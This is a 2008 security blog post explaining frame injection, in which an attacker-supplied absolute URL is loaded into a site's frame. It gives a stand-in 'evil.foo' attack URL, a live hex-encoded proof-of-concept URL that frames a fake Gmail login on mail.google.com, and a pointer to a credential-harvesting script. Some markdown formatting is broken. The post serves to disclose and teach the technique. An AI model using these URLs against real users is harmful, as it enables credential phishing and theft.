---
title: Frame Injection Fun
author: pagvac
date: Fri, 10 Oct 2008 00:01:28 GMT
template: post.pug
category: fucked
---

Frame injection vulnerabilities, although some people might consider them the same as HTML injection/XSS or even a subset, they really are not the same. Here is why:

* There is no need to inject special control characters such as angle brackets (unlike HTMLi/XSS)
* HTMLi/XSS filtering routines will not project against frame injection since the attacker only needs to insert a URL in the non-sanitized parameter

The best way to explain what I mean is to show an example. Most frame injection issues occur in web applications because dynamic [frameset/iframe](http://www.w3.org/TR/html4/present/frames.html) insertion is not implemented with enough filtering. For instance, say that we have the following URL on the target site:

    https://www.victim.foo/index.php?**targeturl**=/contact.php

    A malicious user with intentions of launching a phishing attack will try tampering the `targeturl` parameter. His goal is to insert a third-party page that is under his control, rather than the original contact page. Indeed, `index.php`, although is not allowing HTML or JavaScript to be assigned to `targeturl`, is happy to process an absolute URL rather than a relative one:

    https://www.victim.foo/index.php?**targeturl**=http://evil.foo/login.php

    I thought that showing a live example would help our readers get an idea of what frame injection looks in action. For that purpose, I prepared a rather not elegant proof of concept which takes advantage of the Google Images service. What's neat is that although the legitimate URL would normally use the `images.google.com` domain, Google also allow us to use other google.com subdomains such as `mail.google.com` which is used by Gmail. This is ideal, as we're trying to accomplish a frame injection attack which can be used to perform phishing attacks against Gmail users.

    http://mail.google.com/imgres?imgurl=http://SecureGoogleMail&**imgrefurl**=http://mail.google.com/imgres?imgurl=http://SecureGoogleMail&imgrefurl=%68%74%74%70%3a%2f%2f%73%6e%69%70%75%72%6c%2e%63%6f%6d%2f%67%6e%77%62%6f

<div class="screen">![Frame Injection Fun POC](/files/2008/10/frame-injection-fun-poc-300x210.png "Frame Injection Fun POC")</div>

The previous PoC URL will cause the entered credentials to be submitted to www.gnucitizen.org when clicking on Sign in, so please do NOT submit any real credentials!

> pIn short:p The attacker has managed to display a non-legitimate third-party page, while the legitimate domain (mail.google.com in this case) is shown in the address bar.The beauty of frame injection attacks is that the attacker is able to impersonate a trusted entity without needing to bypass XSS/HTMLi filters or even break into the target server.

_Needless to say, in real-life the attacker would most likely automate the process of obtaining the harvested credentials by using a tool such as our [x.php](http://lab.gnucitizen.org/projects/x-php-data-theft-script) data-theft script._
